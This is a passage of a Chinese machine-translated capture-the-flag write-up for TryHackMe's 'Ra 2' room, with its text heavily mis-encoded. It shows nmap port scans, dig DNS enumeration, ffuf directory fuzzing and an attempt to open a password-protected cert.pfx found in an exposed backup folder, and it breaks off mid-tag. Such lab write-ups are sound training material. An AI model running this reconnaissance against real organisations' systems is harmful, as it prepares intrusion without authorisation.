<html>
<head>
<title>THM Writeup: Ra 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">THMæŠ¥å‘Š:Ra 2</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/thm-writeup-ra-2-ed3de7c719a8?source=collection_archive---------1-----------------------#2022-05-09">https://infosecwriteups.com/thm-writeup-ra-2-ed3de7c719a8?source=collection_archive---------1-----------------------#2022-05-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/1bf2ed0a6b76bd824ceb73dd802e2038.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*0lTj9yiMtPwmFaEu.jpg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><a class="ae kc" href="https://wallpaperaccess.com/ra" rel="noopener ugc nofollow" target="_blank"> RAå£çº¸ã€‚</a></figcaption></figure><p id="ba56" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘é€šè¿‡æšä¸¾åœ¨å¼€æ”¾ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ã€æ»¥ç”¨ä¸å®‰å…¨çš„DNSåŠ¨æ€æ›´æ–°ä»¥åŠä½¿ç”¨PrintSpooferæ¼æ´æå‡æˆ‘åœ¨åŸŸæ§åˆ¶å™¨ä¸Šçš„æƒé™ï¼Œé€æ­¥å®Œæˆäº†åˆ©ç”¨windowsæœºå™¨çš„è¿‡ç¨‹ã€‚è¿™ä¸ªæŒ‘æˆ˜åœ¨<a class="ae kc" href="https://tryhackme.com/room/ra2" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>å¹³å°ä¸Šæœ‰ï¼Œæ ‡é¢˜ä¸ºâ€œ<strong class="kf ir"> Ra 2 </strong>ï¼Œç”±ç”¨æˆ·â€œ<a class="ae kc" href="https://tryhackme.com/p/4ndr34z" rel="noopener ugc nofollow" target="_blank"> <em class="lb"> 4ndr34z </em> </a>â€åˆ›å»ºã€‚</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="32e2" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">æ”¾å¼ƒ</h1><p id="9867" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æˆ‘å–œæ¬¢åœ¨ä¸€ç¯‡æ–‡ç« ä¹‹å‰æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å…è´£å£°æ˜ï¼Œä»¥é¼“åŠ±äººä»¬åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ï¼Œå› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¸­æ˜¾ç„¶ä¼šæœ‰<strong class="kf ir">å‰§é€</strong><strong class="kf ir"/>ã€‚æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœä½ å…ˆè‡ªå·±å°è¯•ï¼Œç„¶ååœ¨é‡åˆ°å›°éš¾æˆ–éœ€è¦æç¤ºæ—¶å†å›æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä½ ä¼šæ›´å–œæ¬¢è¿™ä¸ªæŒ‘æˆ˜ã€‚å› æ­¤ï¼Œæ²¡æœ‰ä»»ä½•è¿›ä¸€æ­¥çš„æ‹–å»¶ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="4e41" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">æŒ‘æˆ˜æè¿°</h1><blockquote class="mm mn mo"><p id="639e" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">WindCorpæœ€è¿‘å‡ºç°äº†å®‰å…¨æ¼æ´ã€‚è‡ªé‚£ä»¥åï¼Œä»–ä»¬ä»é”™è¯¯ä¸­å¸å–æ•™è®­ï¼ŒåŠ å¼ºäº†åŸºç¡€è®¾æ–½ã€‚ä½†ä¹Ÿè®¸è¿˜ä¸å¤Ÿï¼Ÿæ‚¨å·²æˆåŠŸè¿›å…¥ä»–ä»¬çš„æœ¬åœ°ç½‘ç»œâ€¦</p></blockquote></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="292a" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">ç«¯å£æšä¸¾</h1><p id="57a4" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æˆ‘å¼€å§‹æšä¸¾ç›®æ ‡æœºå™¨ï¼Œç”¨<strong class="kf ir"> NMAP </strong>æ‰§è¡Œå¿«é€Ÿæ‰«ææ¥è¯†åˆ«ä»»ä½•æ‰“å¼€çš„ç«¯å£ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="df6e" class="nb lk iq mx b gy nc nd l ne nf">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.207.234</span><span id="40c7" class="nb lk iq mx b gy ng nd l ne nf"><br/>PORT      STATE SERVICE          REASON<br/>53/tcp    open  domain           syn-ack ttl 125<br/>88/tcp    open  kerberos-sec     syn-ack ttl 125<br/>135/tcp   open  msrpc            syn-ack ttl 125<br/>139/tcp   open  netbios-ssn      syn-ack ttl 125<br/>389/tcp   open  ldap             syn-ack ttl 125<br/>443/tcp   open  https            syn-ack ttl 125<br/>445/tcp   open  microsoft-ds     syn-ack ttl 125<br/>464/tcp   open  kpasswd5         syn-ack ttl 125<br/>593/tcp   open  http-rpc-epmap   syn-ack ttl 125<br/>636/tcp   open  ldapssl          syn-ack ttl 125<br/>2179/tcp  open  vmrdp            syn-ack ttl 125<br/>3268/tcp  open  globalcatLDAP    syn-ack ttl 125<br/>3269/tcp  open  globalcatLDAPssl syn-ack ttl 125<br/>5222/tcp  open  xmpp-client      syn-ack ttl 125<br/>5223/tcp  open  hpvirtgrp        syn-ack ttl 125<br/>5229/tcp  open  jaxflow          syn-ack ttl 125<br/>5262/tcp  open  unknown          syn-ack ttl 125<br/>5263/tcp  open  unknown          syn-ack ttl 125<br/>5269/tcp  open  xmpp-server      syn-ack ttl 125<br/>5270/tcp  open  xmp              syn-ack ttl 125<br/>5275/tcp  open  unknown          syn-ack ttl 125<br/>5276/tcp  open  unknown          syn-ack ttl 125<br/>7070/tcp  open  realserver       syn-ack ttl 125<br/>7443/tcp  open  oracleas-https   syn-ack ttl 125<br/>7777/tcp  open  cbt              syn-ack ttl 125<br/>9090/tcp  open  zeus-admin       syn-ack ttl 125<br/>9091/tcp  open  xmltec-xmlmail   syn-ack ttl 125<br/>9389/tcp  open  adws             syn-ack ttl 125<br/>49389/tcp open  unknown          syn-ack ttl 125<br/>49666/tcp open  unknown          syn-ack ttl 125<br/>49668/tcp open  unknown          syn-ack ttl 125<br/>49669/tcp open  unknown          syn-ack ttl 125<br/>49670/tcp open  unknown          syn-ack ttl 125<br/>49673/tcp open  unknown          syn-ack ttl 125<br/>49698/tcp open  unknown          syn-ack ttl 125</span></pre><p id="6136" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æŸ¥çœ‹è¾“å‡ºï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æœ‰35ä¸ªç«¯å£æ‰“å¼€ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨NMAPæ¥è¯†åˆ«æ¯ä¸ªç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ï¼Œå¹¶ä½¿ç”¨é€šç”¨çš„NSEè„šæœ¬æ¥æŸ¥æ‰¾æˆ‘å¯ä»¥åˆ©ç”¨çš„ä»»ä½•å¸¸è§æ¼æ´ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="b44e" class="nb lk iq mx b gy nc nd l ne nf">nmap -sV -sC -Pn -v -oN nmap-report -p 53,88,135,139,443,445,464,593,636,2179,3268,3269,5222,5223,5229,5262,5263,5269,5270,5275,5276,7070,7443,7777,9090,9091,9389,49389,49666,49668,49669,49670,49673,49698 10.10.164.198</span></pre><p id="24e6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°NMAPçš„å¤§é‡è¾“å‡ºå’Œä¸€äº›æœ‰è¶£çš„æœåŠ¡ï¼Œæˆ‘å¯ä»¥è¿›ä¸€æ­¥åˆ—ä¸¾ã€‚</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="4ba7" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">DNSæšä¸¾</h1><p id="e60c" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æ ¹æ®NMAPæ£€ç´¢åˆ°çš„LDAPç«¯å£ä¿¡æ¯ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æ­£åœ¨ä½¿ç”¨çš„åŸŸæ˜¯<strong class="kf ir"> windcorp.thm </strong>ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="c62a" class="nb lk iq mx b gy nc nd l ne nf">636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: <strong class="mx ir">windcorp.thm0</strong>., Site: Default-First-Site-Name)</span></pre><p id="9557" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">NMAPè¯†åˆ«çš„ç¬¬ä¸€ä¸ªå¼€æ”¾ç«¯å£æ˜¯ç«¯å£53(å³DNS)ã€‚ä½¿ç”¨<strong class="kf ir"> dig </strong>æ‰§è¡Œä¸€äº›åŸºæœ¬çš„æšä¸¾ï¼Œåˆ—å‡ºæ‰€æœ‰çš„â€œ<strong class="kf ir"><em class="lb">ã€windcorp . thmã€‘</em></strong>â€DNSè®°å½•ï¼Œ<strong class="kf ir"> </strong>ç»™æˆ‘ç¬¬ä¸€ä¸ªæ ‡å¿—ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="8ea1" class="nb lk iq mx b gy nc nd l ne nf">dig windcorp.thm any @10.10.172.217</span><span id="0a6a" class="nb lk iq mx b gy ng nd l ne nf">;; ANSWER SECTION:<br/>windcorp.thm.           600     IN      A       10.10.172.217<br/>windcorp.thm.           3600    IN      NS      fire.windcorp.thm.<br/>windcorp.thm.           3600    IN      SOA     fire.windcorp.thm. hostmaster.windcorp.thm. 295 900 600 86400 3600<br/>windcorp.thm.           86400   IN      TXT     <strong class="mx ir">"THM{.......}"</strong></span></pre><p id="eb72" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">è¯¥æ ‡å¿—è¿˜å‘<strong class="kf ir">ä¸å®‰å…¨çš„åŠ¨æ€DNSæ›´æ–°</strong>æä¾›äº†æç¤ºã€‚ä¸å®‰å…¨çš„åŠ¨æ€DNSæ›´æ–°å…è®¸æ‚¨åœ¨æ²¡æœ‰èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æ›´æ–°DNSè®°å½•ã€‚è¿™ä¸å®‰å…¨åŠ¨æ€DNSæ›´æ–°ç›¸åï¼Œåœ¨å®‰å…¨åŠ¨æ€DNSæ›´æ–°ä¸­ï¼Œåªæœ‰åŸŸæˆå‘˜å¯ä»¥æ›´æ–°ä»–ä»¬çš„æ¡ç›®ã€‚è¿™æ˜¯é€šè¿‡ä½¿ç”¨kerberoså‘DNSæœåŠ¡å™¨éªŒè¯å®¢æˆ·ç«¯æ¥å®ç°çš„ã€‚è¿™å°†æœ‰åŠ©äºåœ¨ä¸€äº›è¿›ä¸€æ­¥çš„åˆ—ä¸¾(é“ºå«ğŸ˜‰).</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="c5c4" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated"><strong class="ak">ç½‘é¡µæšä¸¾</strong></h1><p id="d05d" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æ ¹æ®NMAPçš„è¾“å‡ºï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ç«¯å£443æ˜¯å¼€æ”¾çš„ï¼Œå¹¶ä¸”æ‰˜ç®¡ç€ä¸€ä¸ªç½‘ç«™ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="4557" class="nb lk iq mx b gy nc nd l ne nf">443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br/>|_http-server-header: Microsoft-HTTPAPI/2.0<br/>|_http-title: Not Found<br/>| ssl-cert: Subject: commonName=fire.windcorp.thm<br/>| Subject Alternative Name: <strong class="mx ir">DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm</strong><br/>| Issuer: commonName=fire.windcorp.thm<br/>| Public Key type: rsa<br/>| Public Key bits: 2048<br/>| Signature Algorithm: sha256WithRSAEncryption<br/>| Not valid before: 2020-05-29T03:31:08<br/>| Not valid after:  2028-05-29T03:41:03<br/>| MD5:   804b dc39 5ce5 dd7b 19a5 851c 01d1 23ad<br/>|_SHA-1: 37f4 e667 cef7 5cc4 47c9 d201 25cf 2b7d 20b2 c1f4<br/>|_ssl-date: 2022-04-15T13:35:16+00:00; -1s from scanner time.<br/>| tls-alpn: <br/>|_  http/1.1</span></pre><p id="705b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘è¿˜å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªä¸»æœºååˆ†åˆ«å«åšâ€œ<strong class="kf ir"><em class="lb">fire . wind corp . thm</em></strong>â€â€œ<strong class="kf ir"><em class="lb">self service . wind corp . thm</em></strong>â€å’Œâ€œ<strong class="kf ir"><em class="lb">self service . dev . wind corp . thm</em></strong>â€ï¼Œæˆ‘æŠŠå®ƒä»¬æ·»åŠ åˆ°æˆ‘çš„<strong class="kf ir"> hosts </strong>æ–‡ä»¶ä¸­ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="b66a" class="nb lk iq mx b gy nc nd l ne nf">10.10.138.163   fire.windcorp.thm selfservice.windcorp.thm selfservice.dev.windcorp.thm</span></pre><p id="0d7c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘ä»è®¿é—®â€œ<strong class="kf ir"><em class="lb">fire . wind corp . thm</em></strong>â€ç½‘ç«™å¼€å§‹ã€‚åœ¨ä¸»é¡µä¸Šï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æ¥è‡ªç®¡ç†å›¢é˜Ÿçš„æ¶ˆæ¯ï¼Œå£°æ˜ä»–ä»¬ä¸å†ä½¿ç”¨ä¸å®‰å…¨çš„IMè½¯ä»¶ï¼Œè¿™æ˜¯å¯¹ç¬¬ä¸€å°<a class="ae kc" href="https://tryhackme.com/room/ra" rel="noopener ugc nofollow" target="_blank"> THM Raæœºå™¨</a>çš„å¼•ç”¨ã€‚ä»–ä»¬è¿˜æåˆ°ä»–ä»¬åœ¨ä»»ä½•åœ°æ–¹éƒ½ä½¿ç”¨T21è¯ä¹¦ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/62214ab5ad437d19c746d62713c7295f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1038/format:webp/1*ZGj5dP3ldKRJERxPICeNtw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æ¥è‡ªç®¡ç†å±‚çš„æ¶ˆæ¯ã€‚</figcaption></figure><p id="f197" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªé“¾æ¥åˆ°â€œ<strong class="kf ir"><em class="lb">self service . wind corp . thm</em></strong>â€çš„æŒ‰é’®ï¼Œè¿™å¯¼è‡´äº†ä¸€ä¸ªç™»å½•å¼¹å‡ºçª—å£ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/0361da6db75111dcf97333fd031ef075.png" data-original-src="https://miro.medium.com/v2/resize:fit:876/format:webp/1*2sqLUZ8ZtqNUCeCY7Fy44w.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">è‡ªåŠ©ç™»å½•ã€‚</figcaption></figure><p id="c7e7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä½¿ç”¨<strong class="kf ir"> Burpsuite </strong>ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°å½“ç”¨æˆ·è¯•å›¾é€šè¿‡é—¨æˆ·ç™»å½•æ—¶ä½¿ç”¨äº†NTLMæˆæƒï¼Œä½†é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘çœ‹ä¸åˆ°ä»»ä½•å…¶ä»–æ„Ÿå…´è¶£çš„ä¸œè¥¿ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/6efb0cec83fdce27a7c61bfb24af37d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1306/format:webp/1*hLN3ZlMRl6KIAaX1ylMycw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Burpsuiteæ‹¦æˆªè‡ªåŠ©ç™»å½•ã€‚</figcaption></figure><p id="edaa" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°ä¸»é¡µä¸Šæœ‰ä¸€ä¸ªITæ”¯æŒäººå‘˜çš„åˆ—è¡¨ã€‚æˆ‘è¿˜å¯ä»¥çœ‹åˆ°å›¾æ ‡ä¼šæ”¹å˜é¢œè‰²ï¼Œè¿™å¯èƒ½è¡¨æ˜ç”¨æˆ·ä½•æ—¶å¤„äºæ´»åŠ¨çŠ¶æ€(å³ç»¿è‰²ã€ç¥ç€è‰²ã€ç°è‰²)ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/1096357ebb380ad60563e8aec544b9f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:612/format:webp/1*FECBfUpwXQ7OfhEV9IIZDQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ITæ”¯æŒäººå‘˜åå•ã€‚</figcaption></figure><p id="67f3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æŸ¥çœ‹ä¸»ç½‘ç«™çš„é¡µé¢æºï¼Œæˆ‘è¿˜å¯ä»¥çœ‹åˆ°ç›®æ ‡æœºå™¨ä¸Šå­˜åœ¨çš„æ½œåœ¨ç”¨æˆ·åˆ—è¡¨ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/36721373642df4ae16cb160b9fbf227f.png" data-original-src="https://miro.medium.com/v2/resize:fit:550/format:webp/1*lW1P_-Lp3jieOZpq_d3Xyw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æ½œåœ¨ç”¨æˆ·ã€‚</figcaption></figure><p id="799d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ç»§ç»­å¾€ä¸‹ï¼Œæˆ‘è¿˜å¯ä»¥çœ‹åˆ°å¦å¤–ä¸‰åå‘˜å·¥ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/cc75594807b439258cdb4673e19fe9d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V6hOs2DMWO4irVF5NKYL2A.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">å‘˜å·¥å½¢è±¡ã€‚</figcaption></figure><p id="ed4a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">åœ¨æ–°æ ‡ç­¾ä¸­æ‰“å¼€è¿™äº›å‘˜å·¥å›¾ç‰‡ä¼šæä¾›æ›´å¤šæ½œåœ¨çš„ç”¨æˆ·åã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="f8f2" class="nb lk iq mx b gy nc nd l ne nf">https://fire.windcorp.thm/img/<strong class="mx ir">Emilieje</strong>.jpg<br/>https://fire.windcorp.thm/img/<strong class="mx ir">lilyleAndSparky</strong>.jpg<br/>https://fire.windcorp.thm/img/<strong class="mx ir">kirkug</strong>.jpg</span></pre><p id="6255" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘ç»§ç»­åˆ—ä¸¾ï¼Œç”¨<strong class="kf ir"> FFuF </strong>å·¥å…·å¿«é€Ÿæœç´¢ä»»ä½•éšè—çš„ç›®å½•æˆ–ç½‘é¡µã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="71f8" class="nb lk iq mx b gy nc nd l ne nf">ffuf -c -u <a class="ae kc" href="https://fire.windcorp.thm/FUZZ" rel="noopener ugc nofollow" target="_blank">https://fire.windcorp.thm/FUZZ</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.bak,.old -ic</span><span id="749a" class="nb lk iq mx b gy ng nd l ne nf">img                     [Status: 301, Size: 153, Words: 9, Lines: 2]<br/>css                     [Status: 301, Size: 153, Words: 9, Lines: 2]<br/>vendor                  [Status: 301, Size: 156, Words: 9, Lines: 2]<br/>IMG                     [Status: 301, Size: 153, Words: 9, Lines: 2]<br/>CSS                     [Status: 301, Size: 153, Words: 9, Lines: 2]<br/>Img                     [Status: 301, Size: 153, Words: 9, Lines: 2]<br/><strong class="mx ir">powershell</strong>              [Status: 302, Size: 165, Words: 6, Lines: 4]</span></pre><p id="9860" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘çœ‹åˆ°æœ‰ä¸€ä¸ªéšè—çš„Windows PowerShell Webè®¿é—®é¡µé¢ï¼Œä½†æˆ‘ç›®å‰æ²¡æœ‰ä»»ä½•ç™»å½•å‡­æ®ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/978b5674a180b131e7a475b60641f9e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*HHs_0RV2NZz1AhSjFJlZqA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Windows PowerShell Webè®¿é—®é¡µã€‚</figcaption></figure><p id="e20a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ç»§ç»­å‰è¿›ï¼Œæˆ‘å¼€å§‹çœ‹â€œ<strong class="kf ir"><em class="lb">self service . dev . wind corp . thm</em></strong><em class="lb">â€ã€‚å¯¼èˆªåˆ°è¿™ä¸ªåœ°å€ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°è¯¥ç½‘ç«™ä»åœ¨å»ºè®¾ä¸­ã€‚</em></p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img src="../Images/90f1c19abff0729fcfa576490af4fd65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DRqbkTxpb66-5eGpYO6n5g.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ç½‘ç«™å»ºè®¾ä¸­ã€‚</figcaption></figure><p id="a2f7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘ç”¨<strong class="kf ir"> FFuF </strong>å·¥å…·å†æ¬¡æœç´¢ä»»ä½•éšè—çš„ç›®å½•æˆ–ç½‘é¡µã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="8cb2" class="nb lk iq mx b gy nc nd l ne nf">ffuf -c -u <a class="ae kc" href="https://selfservice.dev.windcorp.thm/FUZZ" rel="noopener ugc nofollow" target="_blank">https://selfservice.dev.windcorp.thm/FUZZ</a> -w /usr/share/wordlists/dirb/common.txt -e .php,.bak,.old</span><span id="9bf9" class="nb lk iq mx b gy ng nd l ne nf">aspnet_client           [Status: 301, Size: 174, Words: 9, Lines: 2]<br/><strong class="mx ir">backup</strong>                  [Status: 301, Size: 167, Words: 9, Lines: 2]<br/>index.html              [Status: 200, Size: 106, Words: 3, Lines: 6]</span></pre><p id="9bb8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘çœ‹åˆ°æœ‰ä¸€ä¸ªåä¸ºâ€œ<strong class="kf ir"> <em class="lb">å¤‡ä»½</em> </strong>â€çš„éšè—æ–‡ä»¶å¤¹æ˜¯å¯ä»¥è®¿é—®çš„ã€‚åœ¨é‡Œé¢ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªåä¸ºâ€œ<strong class="kf ir"> <em class="lb"> cert.pfx </em> </strong>â€å’Œâ€œ<strong class="kf ir"> <em class="lb"> web.config </em> </strong>â€çš„æ–‡ä»¶ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi np"><img src="../Images/d6d6c88f6c50af899f5801e864bc2300.png" data-original-src="https://miro.medium.com/v2/resize:fit:1106/format:webp/1*8e7zCoxd45uRuUW692V2KQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">å¤‡ä»½æ–‡ä»¶å¤¹å†…å®¹ã€‚</figcaption></figure><p id="f42a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ ¹æ®<a class="ae kc" href="https://book.hacktricks.xyz/cryptography/certificates" rel="noopener ugc nofollow" target="_blank">é»‘å®¢æŠ€å·§</a>:</p><blockquote class="mm mn mo"><p id="bd62" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">PKCS#12æˆ–PFXæ ¼å¼æ˜¯ä¸€ç§äºŒè¿›åˆ¶æ ¼å¼ï¼Œç”¨äºåœ¨ä¸€ä¸ªå¯åŠ å¯†æ–‡ä»¶ä¸­å­˜å‚¨æœåŠ¡å™¨è¯ä¹¦ã€ä¸­é—´è¯ä¹¦å’Œç§é’¥ã€‚PFXæ–‡ä»¶é€šå¸¸æœ‰æ‰©å±•åï¼Œå¦‚ã€‚pfxå’Œ. p12. PFXæ–‡ä»¶é€šå¸¸åœ¨Windowsè®¡ç®—æœºä¸Šç”¨äºå¯¼å…¥å’Œå¯¼å‡ºè¯ä¹¦å’Œç§é’¥ã€‚</p></blockquote><p id="0fa0" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘å¯ä»¥ä½¿ç”¨<strong class="kf ir"> openssl </strong>æŸ¥çœ‹è¯ä¹¦ç»†èŠ‚ï¼Œä½†ä¸å¹¸çš„æ˜¯ï¼Œå®ƒæœ‰å¯†ç ä¿æŠ¤ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="d375" class="nb lk iq mx b gy nc nd l ne nf">$ openssl pkcs12 -info -in cert.pfx </span><span id="9de0" class="nb lk iq mx b gy ng nd l ne nf">Enter Import Password:<br/>MAC: sha256, Iteration 2000<br/>MAC length: 32, salt length: 20<br/><strong class="mx ir">Mac verify error: invalid password?</strong></span></pre><p id="b976" class="pw-post-body-paragraph kd ke iq kf b kg kh 